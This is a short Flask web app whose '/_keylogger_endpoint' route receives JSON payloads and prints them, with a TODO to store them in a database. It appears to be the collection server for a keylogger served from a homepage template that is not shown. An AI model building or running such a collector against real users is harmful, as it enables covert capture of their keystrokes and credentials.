from flask import Flask, render_template, request

app = Flask(__name__)



@app.route("/_keylogger_endpoint", methods=['POST'])
def get_payload():

    payload = request.get_json()
    print(payload)
    # TODO: Need to so something with the payload, ie, save it to an internal database.

    return 'ack'


@app.route('/')
def hello_world():  # put application's code here
    return render_template('homepage.html')


if __name__ == '__main__':
    app.run()
